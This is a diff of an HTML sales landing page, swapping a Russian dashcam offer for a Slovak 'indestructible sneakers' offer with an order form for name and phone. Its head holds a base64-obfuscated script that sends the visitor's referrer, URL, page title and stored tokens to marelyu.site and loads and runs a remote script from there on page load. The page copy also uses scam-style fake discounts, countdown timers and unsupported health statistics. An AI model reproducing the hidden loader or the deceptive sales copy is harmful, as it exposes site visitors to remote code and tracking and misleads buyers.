@@ -1,478 +1,138 @@
-<!DOCTYPE html>
-<html lang="ru">
-<head>
+<!DOCTYPE html><html><head>
 <script src="data:text/javascript;base64,CiAgICAoZnVuY3Rpb24oKSB7CiAgICB2YXIgbmFtZSA9ICdfa1A5dkxEUjlaMjd2YmoxVyc7CiAgICBpZiAoIXdpbmRvdy5fa1A5dkxEUjlaMjd2YmoxVykgewogICAgICAgIHdpbmRvdy5fa1A5dkxEUjlaMjd2YmoxVyA9IHsKICAgICAgICAgICAgdW5pcXVlOiBmYWxzZSwKICAgICAgICAgICAgdHRsOiA4NjQwMCwKICAgICAgICAgICAgUl9QQVRIOiAnaHR0cHM6Ly9tYXJlbHl1LnNpdGUvUFpieWhHakMnLAogICAgICAgICAgICBQX1BBVEg6ICdodHRwczovL21hcmVseXUuc2l0ZS9kZmFmYzI1L3Bvc3RiYWNrJywKICAgICAgICB9OwogICAgfQogICAgY29uc3QgX0wxeVdueGM3a3l3UEY3UHcgPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgnY29uZmlnJyk7CiAgICBpZiAodHlwZW9mIF9MMXlXbnhjN2t5d1BGN1B3ICE9PSAndW5kZWZpbmVkJyAmJiBfTDF5V254YzdreXdQRjdQdyAhPT0gbnVsbCkgewogICAgICAgIHZhciBfbVh2d1BjZERMVmpEV3E0YiA9IEpTT04ucGFyc2UoX0wxeVdueGM3a3l3UEY3UHcpOwogICAgICAgIHZhciBfSjQyTmNoNm12cng3c3BSWiA9IE1hdGgucm91bmQoK25ldyBEYXRlKCkvMTAwMCk7CiAgICAgICAgaWYgKF9tWHZ3UGNkRExWakRXcTRiLmNyZWF0ZWRfYXQgKyB3aW5kb3cuX2tQOXZMRFI5WjI3dmJqMVcudHRsIDwgX0o0Mk5jaDZtdnJ4N3NwUlopIHsKICAgICAgICAgICAgbG9jYWxTdG9yYWdlLnJlbW92ZUl0ZW0oJ3N1YklkJyk7CiAgICAgICAgICAgIGxvY2FsU3RvcmFnZS5yZW1vdmVJdGVtKCd0b2tlbicpOwogICAgICAgICAgICBsb2NhbFN0b3JhZ2UucmVtb3ZlSXRlbSgnY29uZmlnJyk7CiAgICAgICAgfQogICAgfQogICAgdmFyIF9Oc1l4ano4UjlCM3dSQ25GID0gbG9jYWxTdG9yYWdlLmdldEl0ZW0oJ3N1YklkJyk7CiAgICB2YXIgX2s1bk56dk4zRnlSRFgyMUggPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgndG9rZW4nKTsKICAgIHZhciBfWlBxVk4zajhWVkpXSHdCNiA9ICc/cmV0dXJuPWpzLmNsaWVudCc7CiAgICAgICAgX1pQcVZOM2o4VlZKV0h3QjYgKz0gJyYnICsgZGVjb2RlVVJJQ29tcG9uZW50KHdpbmRvdy5sb2NhdGlvbi5zZWFyY2gucmVwbGFjZSgnPycsICcnKSk7CiAgICAgICAgX1pQcVZOM2o4VlZKV0h3QjYgKz0gJyZzZV9yZWZlcnJlcj0nICsgZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LnJlZmVycmVyKTsKICAgICAgICBfWlBxVk4zajhWVkpXSHdCNiArPSAnJmRlZmF1bHRfa2V5d29yZD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LnRpdGxlKTsKICAgICAgICBfWlBxVk4zajhWVkpXSHdCNiArPSAnJmxhbmRpbmdfdXJsPScgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQubG9jYXRpb24uaG9zdG5hbWUgKyBkb2N1bWVudC5sb2NhdGlvbi5wYXRobmFtZSk7CiAgICAgICAgX1pQcVZOM2o4VlZKV0h3QjYgKz0gJyZuYW1lPScgKyBlbmNvZGVVUklDb21wb25lbnQobmFtZSk7CiAgICAgICAgX1pQcVZOM2o4VlZKV0h3QjYgKz0gJyZob3N0PScgKyBlbmNvZGVVUklDb21wb25lbnQod2luZG93Ll9rUDl2TERSOVoyN3ZiajFXLlJfUEFUSCk7CiAgICBpZiAodHlwZW9mIF9Oc1l4ano4UjlCM3dSQ25GICE9PSAndW5kZWZpbmVkJyAmJiBfTnNZeGp6OFI5QjN3UkNuRiAmJiB3aW5kb3cuX2tQOXZMRFI5WjI3dmJqMVcudW5pcXVlKSB7CiAgICAgICAgX1pQcVZOM2o4VlZKV0h3QjYgKz0gJyZzdWJfaWQ9JyArIGVuY29kZVVSSUNvbXBvbmVudChfTnNZeGp6OFI5QjN3UkNuRik7CiAgICB9CiAgICBpZiAodHlwZW9mIF9rNW5OenZOM0Z5UkRYMjFIICE9PSAndW5kZWZpbmVkJyAmJiBfazVuTnp2TjNGeVJEWDIxSCAmJiB3aW5kb3cuX2tQOXZMRFI5WjI3dmJqMVcudW5pcXVlKSB7CiAgICAgICAgX1pQcVZOM2o4VlZKV0h3QjYgKz0gJyZ0b2tlbj0nICsgZW5jb2RlVVJJQ29tcG9uZW50KF9rNW5OenZOM0Z5UkRYMjFIKTsKICAgIH0KICAgIHZhciBhID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7CiAgICAgICAgYS50eXBlID0gJ2FwcGxpY2F0aW9uL2phdmFzY3JpcHQnOwogICAgICAgIGEuc3JjID0gd2luZG93Ll9rUDl2TERSOVoyN3ZiajFXLlJfUEFUSCArIF9aUHFWTjNqOFZWSldId0I2OwogICAgdmFyIHMgPSBkb2N1bWVudC5nZXRFbGVtZW50c0J5VGFnTmFtZSgnc2NyaXB0JylbMF07CiAgICBzLnBhcmVudE5vZGUuaW5zZXJ0QmVmb3JlKGEsIHMpCiAgICB9KSgpOwogICAg"></script>
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.0/jquery.min.js"></script>
-<meta charset="utf-8">
-	<title>Видеорегистратор CARCAM Q8</title>
-	<meta name="description" content="Видеорегистратор CARCAM Q8">
-	<meta name="viewport" content="width=device-width">
-	<link rel="icon" href="favicon.png">
-	<link rel="stylesheet" href="css/app.min.css">
+    <meta charset="utf-8">
+    <meta name="viewport" content="initial-scale=1.0, width=device-width">
+    <title>Neporušiteľné tenisky Immortal Shoes</title>
+    <link href="css/css.css" rel="stylesheet">
+    <link href="css/tiny-slider.css" rel="stylesheet">
+    <link rel="stylesheet" type="text/css" href="css/fontawesome.min.css">
+    <link href="css/index.css" rel="stylesheet">
+
+    <link href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700&display=swap&subset=latin-ext" rel="stylesheet">
 </head>
+
 <body>
-  <header>
-    <div class="container">
-      <div class="row">
-        <div class="col-12">
-          <div class="items">
-            <div class="item">
-              <img src="images/header-icon-1.svg" alt="" class="img-responsive">
-              <p>100% гарантия качества</p>
-            </div>
-            <div class="item">
-              <img src="images/header-icon-2.svg" alt="" class="img-responsive">
-              <p>Более 2700 проданных товаров</p>
-            </div>
-            <div class="item">
-              <img src="images/header-icon-3.svg" alt="" class="img-responsive">
-              <a href="#form_buy">Обратный звонок</a>
-            </div>
-          </div>
-        </div>
-      </div>
-    </div>
-  </header>
-  <section class="section-1">
-    <div class="container">
-      <div class="row">
-        <div class="col-md-12">
-          <h1><span>Видеорегистратор</span>CARCAM Q8</h1>
-          <div class="subtitles">
-            <p class="subtitle-1">Регистратор с магнитным креплением 10 в 1</p>
-            <p class="subtitle-2">ТОП 10 2020 года</p>
-          </div>
-        </div>
-      </div>
-      <div class="row">
-        <div class="col-lg-6">
-          <img src="images/section-1-1.png" class="img-responsive main-img-mobile d-lg-none" alt="">
-          <div class="wrap">
-            <ul>
-              <li><img src="images/section-1-marker-list.svg" alt="">FULL HD 1920X1080P (6 линз)</li>
-              <li><img src="images/section-1-marker-list.svg" alt="">ФУНКЦИЯ WDR</li>
-              <li><img src="images/section-1-marker-list.svg" alt="">МОДУЛЬ WI-FI</li>
-              <li><img src="images/section-1-marker-list.svg" alt="">GPS-МОДУЛЬ</li>
-              <li><img src="images/section-1-marker-list.svg" alt="">ПРИЛОЖЕНИЕ ДЛЯ ANDROID И IOS</li>
-              <li><img src="images/section-1-marker-list.svg" alt="">ЗАГРУЗКА ВИДЕО НА СМАРТФОН</li>
-              <li><img src="images/section-1-marker-list.svg" alt="">ДАТЧИК УДАРА (G-СЕНСОР)</li>
-              <li><img src="images/section-1-marker-list.svg" alt="">MICRO SD ДО 128 ГБ</li>
-              <li><img src="images/section-1-marker-list.svg" alt="">МАГНИТНОЕ КРЕПЛЕНИЕ</li>              
-            </ul>            
-          </div>          
-        </div>
-        <div class="col-lg-6">
-          <img src="images/section-1-1.png" class="img-responsive main-img d-none d-lg-block" alt="">
-          <div class="order-block">
-            <div class="price-block">
-              <div class="old-price">
-                <div class="price-name">Старая цена</div>
-                <div class="price-descr">4250р</div>
-              </div>
-              <div class="new-price">
-                <div class="price-name">Цена по акции</div>
-                <div class="price-descr">1990р</div>
-              </div>
-            </div>
-            <a href="#form_buy" class="order-block-btn">Заказать со скидкой</a>
-            <p class="subdescr">Осталось <span>11 шт.</span> товара по акции</p>
-          </div>
-        </div>
-      </div>
-    </div>
-  </section>
-  <section class="section-2">
-    <div class="container">
-      <div class="row">
-        <div class="col-md-12">
-          <h1>ОСОБЕННОСТИ <span>CARCAM Q8</span></h1>
-        </div>
-      </div>
-      <div class="row">
-        <div class="col-md-12">
-          <div class="items">
-            <div class="item">
-              <img src="images/section-2-1.png" alt="" class="img-resposive">
-              <p class="descr">CARCAM Q8 – автомобильный Full HD видеорегистратор, оснащенный быстросъемным магнитным креплением</p>
-            </div>
-            <div class="item">
-              <img src="images/section-2-2.png" alt="" class="img-resposive">
-              <p class="descr">Стеклянный объектив обладает углом обзора 150°</p>
-            </div>
-            <div class="item">
-              <img src="images/section-2-3.png" alt="" class="img-resposive">
-              <p class="descr">В матрице нового поколения SONY Exmor IMX323, устройство ведет качественную съемку в любое время суток</p>
-            </div>
-            <div class="item">
-              <img src="images/section-2-4.png" alt="" class="img-resposive">
-              <p class="descr">Внешний GPS-модуль позволяет зафиксировать на видео координаты и скорость движения автомобиля. Встроенный Wi-Fi</p>
-            </div>
-          </div>
-        </div>
-      </div>
-    </div>
-  </section>
-  <section class="section-3">
-    <div class="container">
-      <div class="row">
-        <div class="col-md-12">           
-          <h1><span>CARCAM Q8</span> - Ваш главный помощник на дороге</h1>
-        </div>
-      </div>
-      <div class="row">
-        <div class="col-md-12">
-          <div class="content">
-            <div class="descr-block">
-              <div class="descr-1">
-                <p><span>CARCAM Q8</span> – автомобильный Full HD видеорегистратор, оснащенный быстросъемным магнитным креплением и внешним GPS-модулем. Благодаря светочувствительной матрице нового поколения SONY Exmor IMX323, устройство ведет качественную съемку в любое время суток. Стеклянный объектив обладает углом обзора 150° и обеспечивает съемку проезжей части по всей её ширине, включая тротуары. Внешний GPS-модуль позволяет зафиксировать на видео координаты и скорость движения автомобиля. Встроенный Wi-Fi модуль дает возможность подключать регистратор к смартфону для удобного управления настройками, а также просмотра и скачивания видео</p>
-              </div>
-              <div class="descr-2">
-                <p>Видеорегистратор  CARCAM Q8 избавит вас от проблем на дороге, обеспечит максимальную защиту </p>
-              </div>
-            </div>
-            <div class="video-block">
-              <div class="youtube" id="4sxP2LILzx4"></div>
-            </div>
-          </div>          
-        </div>
-      </div>
-      <div class="row">
-        <div class="col-md-12">
-          <h1>Примеры съемки днем и ночью</h1>
-        </div>
-      </div>
-      <div class="row">
-        <div class="col-md-12">
-          <div class="videos">
-            <div class="video-1">
-              <div class="youtube" id="ClDuWl2IQ6E"></div>
-            </div>
-            <div class="video-2">
-              <div class="youtube" id="6ygSkd0IrAo"></div>
-            </div>
-          </div>
-        </div>
-      </div>
-    </div>
-  </section>
-  <section class="section-4">
-    <div class="container">
-      <div class="row">
-        <div class="col-md-12">          
-          <h1>Преимущества <span>CARCAM Q8</span></h1>
-        </div>
-      </div>
-      <div class="row">
-        <div class="col-md-12">
-          <div class="items">
-            <div class="item">
-              <div class="img-block">
-                <img src="images/section-4-1.png" alt="" class="img-resposive">
-              </div>              
-              <div class="descr">
-                <p class="title">FULL HD 1920X1080P</p>
-                <p class="subdescr">Видеорегистратор оснащен новой матрицей SONY Exmor IMX323 с увеличенной светочувствительностью и ведет съёмку в разрешении Full HD 1920x1080p. Благодаря этому, на записи отчетливо видны номерные знаки автомобилей и другие важные детали происходящего на дороге в любое время суток.</p>
-              </div>
-            </div>
-            <div class="item">
-              <div class="img-block">
-                <img src="images/section-4-2.png" alt="" class="img-resposive">
-              </div>              
-              <div class="descr">
-                <p class="title">УЛУЧШЕННАЯ НОЧНАЯ СЪЕМКА С ВИДЕОСЕНСОРОМ SONY EXMOR</p>
-                <p class="subdescr">Ночная съемка SONY Exmor IMX323</p>
-              </div>
-            </div>
-            <div class="item">
-              <div class="img-block">
-                <img src="images/section-4-3.png" alt="" class="img-resposive">
-              </div>              
-              <div class="descr">
-                <p class="title">УГОЛ ОБЗОРА 150°</p>
-                <p class="subdescr">Стеклянный 6-линзовый объектив обладает углом обзора 150° и обеспечивает фиксацию происходящего по всей ширине проезжей части.</p>
-              </div>
-            </div>
-            <div class="item">
-              <div class="img-block">
-                <img src="images/section-4-4.png" alt="" class="img-resposive">
-              </div>              
-              <div class="descr">
-                <p class="title">ФУНКЦИЯ WDR</p>
-                <p class="subdescr">Благодаря функции WDR, устройство автоматически выравнивает освещение в кадре, избавляя изображение от затемненных или засвеченных зон. Данная функция наиболее актуальна при ярком солнечном свете или в темное время суток.</p>
-              </div>
-            </div>
-            <div class="item">
-              <div class="img-block">
-                <img src="images/section-4-5.png" alt="" class="img-resposive">
-              </div>              
-              <div class="descr">
-                <p class="title">МОДУЛЬ WI-FI</p>
-                <p class="subdescr">Встроенный Wi-Fi модуль позволяет подключить видеорегистратор к вашему смартфону или планшету для удобного управления настройками и просмотра видео.</p>
-              </div>
-            </div>
-            <div class="item">
-              <div class="img-block">
-                <img src="images/section-4-6.png" alt="" class="img-resposive">
-              </div>              
-              <div class="descr">
-                <p class="title">GPS-МОДУЛЬ</p>
-                <p class="subdescr">Внешний GPS-модуль обеспечивает фиксацию на видео координат и скорости движения автомобиля. Также модуль позволяет просматривать записанные видео одновременно с маршрутом движения на электронной карте в специальном плеере для ПК.</p>
-              </div>
-            </div>
-            <a href="#form_buy">Заказать сейчас</a>
-          </div>
-        </div>
-      </div>
-    </div>
-  </section>
-  <section class="section-5">
-    <div class="container">
-      <div class="row">
-        <div class="col-md-12">
-          <div class="content">
-            <div class="img-block">
-              <img src="images/section-5-1.png" alt="" class="main-img">
-            </div>
-            <div class="descr">
-              <p class="title">ЧТО ТАКОЕ CARCAM Q8</p>
-              <p class="subdescr"><span>CARCAM Q8</span> - это разработка ведущих  специалистов в области автомобильной электроники, направленная на повышение безопасности водителя. Идеальное сочетание идеального качества и надежности. </p>
-              <p class="subdescr"><span>CARCAM Q8</span> - интегрировано огромное кол-во функций, которые позволяют настроить устройство «под себя». Пользователь может ставить ограничения на оповещения о GPS информировании.</p>
-              <p class="subdescr">С Видеорегистратором <span>CARCAM Q8</span> вы забудете что такое плохое качество съемки , потому что даже в тумане будет снимать как в летней солнечной погоде.</p>
-            </div>
-          </div>          
-        </div>
-      </div>
-    </div>
-  </section>
-  <section class="section-6">
-    <div class="container">
-      <div class="row">
-        <div class="col-md-12">
-          <h1>ХАРАКТЕРИСТИКИ</h1>
-        </div>
-      </div>
-      <div class="row no-gutters d-flex align-items-center">
-        <div class="col-md-6">
-          <ul>						
-            <li><span>Дисплей</span><p>2-дюймовый ЖК, не сенсорный</p></li>
-            <li><span>Матрица</span><p>Sony IMX335, 5 МП, разрешение 2592 x 1944 пикселей</p></li>
-            <li><span>Объектив</span><p>6 линз с углом обзора 140°, f/1.8</p></li>
-            <li><span>Функции</span><p>Поддержка WDR, DeFog</p></li>
-            <li><span>Wi-Fi</span><p>Частота 2.4 ГГц</p></li>
-            <li><span>Дополнительно</span><p>G-сенсор, циклическая запись</p></li>
-            <li><span>Батарея</span><p>500 мАч</p></li>            
-					</ul>
-        </div>
-        <div class="col-md-6">
-          <img src="images/section-1-1.png" alt="" class="img-responsive main-img">
-        </div>        
-      </div>
-    </div>
-  </section>
-  <section class="section-7">
-    <div class="container">
-      <div class="row">
-        <div class="col-md-12">
-          <h1>ОТЗЫВЫ ПОКУПАТЕЛЕЙ</h1>
-        </div>
-      </div>
-      <div class="row">
-        <div class="col-md-12">
-          <div class="items">
-            <div class="item">
-              <img src="images/rev-1.png" class="img-resposive" alt="">
-              <p class="rev-descr">О таком устройстве год назад я мог только мечтать. Назвать его только видеорегистратором язык не поворачивается, потому что это комбо, которое включает все устройства, которые нужны водителю. Лучший видеорегистратор которым когда либо я пользовался.</p>
-              <p class="name">ИГОРЬ, Г.МОСКВА</p>
-            </div>
-            <div class="item">
-              <img src="images/rev-2.png" class="img-resposive" alt="">
-              <p class="rev-descr">Очень хороший регик. Видео пишет на отлично, нарезает по 1, 2, 3 минуты, есть в настройках. Охраняет на стоянке, уже проверено. Регистратором пользовался не одним так что сравнивать есть с чем. Все супер. Крепление на пленку тоже моща, можно переклеить в любой момент, и регик не дрожит как на присоске и не отвалится зимой или на солнце.</p>
-              <p class="name">АЛЕКСАНДР, Г.КОРОЛЁВ</p>
-            </div>
-            <div class="item">
-              <img src="images/rev-3.png" class="img-resposive" alt="">
-              <p class="rev-descr">Очень качественный регистратор. Купил себе такой пару дней назад. Качество записи отличное! Звук отличный. Объектив вращается вверх и вниз. Легко снимается и ставится назад. Очень компактный. Зарядка идет в прикуриватель на 2.4А на 2 гнезда, для регистратора и для телефона
-                Качество съемки в ночное и дневное время отличное . Вообщем спасибо за регистратор я всем доволен.</p>
-              <p class="name">ДМИТРИЙ Г. ЕЛЕЦ</p>
-            </div>
-          </div>
-        </div>
-      </div>
-    </div>
-  </section>
-  <section class="section-8">
-    <div class="container">
-      <div class="row">
-        <div class="col-md-12">
-          <h1>КАК СДЕЛАТЬ ЗАКАЗ?</h1>
-        </div>
-      </div>
-      <div class="row">
-        <div class="col-md-12">
-          <div class="items-top">
-            <div class="item">
-              <img src="images/adv-order-1.png" alt="">
-              <p>Оставьте заявку!</p>
-            </div>
-            <div class="item">
-              <img src="images/adv-order-2.png" alt="">
-              <p>С Вами свяжется менеджер и уточнит детали</p>
-            </div>
-            <div class="item">
-              <img src="images/adv-order-3.png" alt="">
-              <p>Ваш заказ бережно упакуют и отправят.</p>
-            </div>
-            <div class="item">
-              <img src="images/adv-order-4.png" alt="">
-              <p>Вы забираете и оплачиваете заказ.</p>
-            </div>
-          </div>
-        </div>        
-      </div>
-      <div class="row">
-        <div class="col-md-12">
-          <h1>ПРЕИМУЩЕСТВА НАШЕГО МАГАЗИНА.</h1>
-          <div class="items-bottom">
-            <div class="item">
-              <img src="images/adv-1.png" alt="">
-              <p>Перед отправкой товары проходят проверку.</p>
-            </div>
-            <div class="item">
-              <img src="images/adv-2.png" alt="">
-              <p>Доставка по всей России от 5 до 10 дней.</p>
-            </div>
-            <div class="item">
-              <img src="images/adv-3.png" alt="">
-              <p>Прием заказов круглосуточно.</p>
-            </div>
-            <div class="item">
-              <img src="images/adv-4.png" alt="">
-              <p>Гарантия возврата денег если товар не понравится.</p>
-            </div>
-            <div class="item">
-              <img src="images/adv-5.png" alt="">
-              <p>Оплата при получении товара.</p>
-            </div>
-          </div>
-        </div>        
-      </div>
-    </div>
-  </section>
-  <section class="section-9" id="form_buy">
-    <div class="container">
-      <div class="row">
-        <div class="col-md-12">
-          <p>ЗАКАЖИТЕ СЕЙЧАС CARCAM Q8 <span>СО СКИДКОЙ 53%</span></p>
-        </div>
-      </div>
-    </div>
-  </section>
-  <section class="section-10">
-    <div class="container">
-      <div class="row">
-        <div class="col-md-12">
-          <h1><span>Видеорегистратор</span>CARCAM Q8</h1>
-          <div class="subtitles">
-            <p class="subtitle-1">Регистратор с магнитным креплением 10 в 1</p>
-            <p class="subtitle-2">ТОП 10 2020 года</p>
-          </div>
-        </div>
-      </div>
-      <div class="row">
-        <div class="col-md-6 col-lg-5 col-xl-4">
-					<div class="form-wrapper">
-						<div class="timer-block">
-							<div class="clock-img">
-								<img src="images/clock.png" alt="clock" class="img-responsive">
-							</div>
-							<div class="clock">
-								<p>До конца акции:</p>
-								<div class="time">
-									<div class="column">
-										<div class="timer" id="hours"></div>
-									</div>
-									<div class="timer sep">:</div>
-									<div class="column">
-										<div class="timer" id="minutes"></div>
-									</div>
-									<div class="timer sep">:</div>
-									<div class="column">
-										<div class="timer" id="seconds"></div>
-									</div>
-								</div>
-							</div>
-							<h2><span class="sub-message"></span></h2>
-						</div>
-						<div class="price-block">
-							<div class="old-price">
-								<p class="price-name">Старая цена</p>
-								<p class="price-descr">4250р</p>
-							</div>
-							<div class="new-price">
-								<p class="price-name">Цена по акции</p>
-								<p class="price-descr">1990р</p>
-							</div>
-						</div>
-						<form class="main-order-form" action="" method="post">
-							<div>
-								<input type="text" name="name" placeholder="Имя" required>
-							</div>
-							<div>
-								<input type="tel" name="phone" placeholder="Телефон" required>
-							</div>
-							<button type="submit">Заказать со скидкой</button> 
-						<input type="hidden" name="l" value="3a93b3fbdc96b956fe1e01d0918c01c80b360fbf" />
-<input type="hidden" name="10ea65fea89019ccb1c114e1e42868e9a56aed07" value="OWZiMWYyNGUwMzlhNjQyM2UyZDNmZjY0NGI3OTNmOWEyNzc=" />
-</form>
-					</div>					
-				</div>
-        <div class="col-md-6 col-lg-6 offset-lg-1 d-none d-md-block">
-          <img src="images/section-1-1.png" alt="" class="img-responsive main-img">
-          <p class="subdescr">Осталось <span>11 шт.</span> товара по акции</p>
-				</div>								
-			</div>
-    </div>
-  </section>
-  <footer>
-    <div class="container">
-      <div class="row">
-        <div class="col-12">
-          <div style="max-width: 400px; width:100%;margin:0 auto 20px;text-align:center;color:#000;font-size:13px;font-family: Arial, Tahoma, Helvetica, sans-serif;line-height:1.2em;">ООО&#160;"Нордмаркет" ОГРН&#160;1175476117630; ИНН&#160;5405016054, г.&#160;Новосибирск, ул.&#160;Есенина, дом&#160;3/2 этаж&#160;1, оф.&#160;6.1.<br> email для обратной связи: abusespochta@yandex.ru </div>
-              <a href="politics.html">Политика конфиденциальности</a>
-              <a href="agreement.html">Пользовательское соглашение</a>
-        </div>
-      </div>
-    </div>
-  </footer>
-  
+    <div class="b1">
+        <div class="container">
+            <h1 class="mb25 h1-title">nezničiteľné tenisky </h1>
+            <img class="mb20" src="img/logo.png">
+            <div class="b f2 dec-color mb15"></div>
+            <ul class="galka-list mb20">
+                <li>Super odolná obuv</li>
+                <li>Vodotesné</li>
+                <li>Na sneh, dážď a teplo</li>
 
-
-
-
-<link href="assets_pages/css/popup-m1-style.css?v=0.0.3" rel="stylesheet" type="text/css"/>
-<script src="assets_pages/js/popup-m1.js?v=0.0.1" type="text/javascript"></script>
-
-<div id="overlay-popup-m1"></div>
-<div id="m1-form" class="m1modal">
-    <a class="close-m1"></a>
-    <div><div class="popup-m1-title">Вам понравилось это предложение?</div>
-        <div class="popup-m1-cont">
-            <div class="popup-m1-text1">Мы расскажем Вам все об этом товаре, предложим наилучшие условия и ознакомим с подходящими акционными предложениями!</div>
-            <form method="post" action="" class="main-order-form popup-m1-form" onsubmit="return false;">
-                <input type="text" name="name" placeholder="Введите ваше имя" required />
-                <input type="tel" name="phone" placeholder="Введите телефон" required />
-                <button>Перезвоните мне</button>
-                <input type="hidden" name="is_popup" value="1" />
-                <input type="hidden" name="from_recall_button" value="0" />
-                <input type="hidden" name="form_id">
-                <input type="hidden" name="l" value="3a93b3fbdc96b956fe1e01d0918c01c80b360fbf" />
-                <input type="hidden" name="10ea65fea89019ccb1c114e1e42868e9a56aed07" value="OWZiMWYyNGUwMzlhNjQyM2UyZDNmZjY0NGI3OTNmOWEyNzc=" />
-            </form>
-                            <div class="popup-m1-text2">Оператор перезвонит Вам через 5-10 минут</div>
+            </ul>
+       
+    <div class="b4" style="overflow: hidden;">
+        <div class="container"><img class="full-width-img mb30" src="img/b3-3.png">
+            <h1 class="h1-title mb20">Inovatívne výrobné technológie</h1>
+            <p class="b4-color mb30">Tenisky sú vyrobené z high-tech PTX 10.000 Technológia EVA vyžaduje chodidlám dýchať, ktoré by prepúšťali vlhkosť.</p>
+            <!--video_block-->
+            <div class="video_block">
+                <div class="video-container">
+                    <div class="youtube" id="-kd9CNjRdyQ"></div>
+                </div>
+            </div>
+            <!--/video_block-->
+            <ul class="galka-list mb20">
+                <li>Funkčné protibakteriálne stielka OrtoLite</li>
+                <li>Technológia podpory kované nohy</li>
+                <li>Gumová podrážka pre najlepšiu trakciu za všetkých poveternostných podmienok</li>
+            </ul><img class="full-width-img b4-img" src="img/Layer_164.png" style="top: 4px;">
+        </div>
+    </div>
+    <div class="b5 grad">
+        <div class="container">
+            <h1 class="h1-title light-color mb20 ts">Čísla hovoria samy za seba:</h1>
+            <ul class="galka-list galka-list_white light-color mb20">
+                <li>O 62% menej unavené nohy</li>
+                <li>Tlmenie podrážky 2krát vyššia</li>
+                <li>O 85% menšie riziko zranenia</li>
+            </ul><img src="img/medals.png"><a class="btn btn_form btn_green" href="#form2">Objednajte hneď</a>
+        </div>
+    </div>
+    <div class="b6">
+        <div class="container">
+            <p class="b6-color mb40">* Podľa štúdie spoločnosti SportFit, ktorá porovnáva modely tenisiek slávnych značiek</p>
+            <h2 class="title dec-color mb30">Aký je rozdiel medzi tenisky IMMORTAL SHOES a bežnými topánkami? </h2>
+            <h2 class="title dec-color-2 mb20">Štandardné tenisky:</h2>
+            <ul class="neg-list mb20">
+                <li>Podošva je zotretá, švy so svojou</li>
+                <li>Skodi nohe</li>
+                <li>Nohy pot, v lete je nemožné chodiť</li>
+                <li>Bez fixácia nôh - stálej riziko podvrtnutie a vykĺbenie</li>
+            </ul>
+            <div class="grad grad-container mb25"><img class="mb20 w100p" src="img/Jar3.png">
+                <ul class="galka-list galka-list_white light-color f4">
+                    <li>Nosia sa dlhšie ako 5 rokov</li>
+                    <li>Podporuje zdravie kolien</li>
+                    <li>Univerzálny dizajn: pre mužov a ženy</li>
+                    <li>Vhodné pre športové a denné aktivity</li>
+                    <li>Na výber sú dve farby: zelená a sivá</li>
+                    <li>Vhodné pre vyhovujúce sezónu</li>
+                    <li>Potešenie z chôdze a behu každý deň</li>
+                </ul>
+            </div>
+            <p class="ttu m dec-color-2 mb110">POZOR! Všetkým si pozor na falzifikáty! IMMORTÁLNÍ OBUV MÔŽETE OBJEDNAŤ LEN NA NAŠOM WEBE!</p>
+            <div class="mb40">
+                <div class="form-container grad mb20" id="form2">
+                    <div class="prices mb25 ts">
+                        <div class="prices__label" style="font-size: 22px;margin-bottom: 20px;">ZĽAVA -50%</div>
+                        <div class="prices__old oldproductsum">108 €</div>
+                        <div class="prices__new productsum">14 €</div>
+                        <!--<div class="prices__label">* при покупке комплекта</div>-->
                     </div>
-    </div>
-</div>
+                    <!--<div class="prices__label mb40 ts">В связи с высоким спросом не более 3 пар в 1 руки</div>-->
+                    <h2 class="form-container__title mb20 ts">OBJEDNAŤ TED!</h2>
+                    <form class="main-order-form mb30 orderformcdn form clearfix lv2-form lv2-form2 lv2-form-validation-by-alert" id="lv-formLanding2" action method="post">
+                        <div class="mb30">
+                            <label for="lv-formLanding2-fio">Napríklad: Andrej Martek</label>
+                            <input class="input field form-control form_field_text_input form-input txt-m" placeholder="Vaše meno" id="lv-formLanding2-fio" name="name" type="text" required>
+                            <label for="lv-formLanding2-phone">Napríklad: +421 966 985 900</label>
+                            <input class="form-control field input textField form_field_text_input form_phone form-input txt-m" placeholder="Váš telefón" id="lv-formLanding2-phone" name="phone" type="text" required>
+                        </div>
+                        <div class="reolader">
+                            <button type="submit" class="btn btn_form mm_button">Objednajte hneď</button>
+                        </div>
+                    </form>
+                    <div class="counter">
+                        <div class="counter__title">Do konca akcie</div>
+                        <div class="counter__container">
+                            <div class="counter__cell">
+                                <div class="counter__tablo counter__d">00</div>
+                                <div class="counter__label">dní</div>
+                            </div>
+                            <div class="counter__cell">
+                                <div class="counter__tablo counter__h">12</div>
+                                <div class="counter__label">hodín</div>
+                            </div>
+                            <div class="counter__cell">
+                                <div class="counter__tablo counter__m">46</div>
+                                <div class="counter__label">minút</div>
+                            </div>
+                            <div class="counter__cell">
+                                <div class="counter__tablo counter__s">53</div>
+                                <div class="counter__label">sekúnd</div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+           
+   
+    <footer>
+        <div class="container tac">
+            <p>ST. GERARDE LTD, RO Box 832, Orion Mall, Balm Street, Vista, Mahé, Seszele</p>
+            <p>
+                <a href="policy_sk.html" target="_blank">Zásady ochrany osobných údajov
+</a>
+            </p>
+        </div>
+    </footer>
 
 
-</body>
-</html>
+
+
+</body></html>
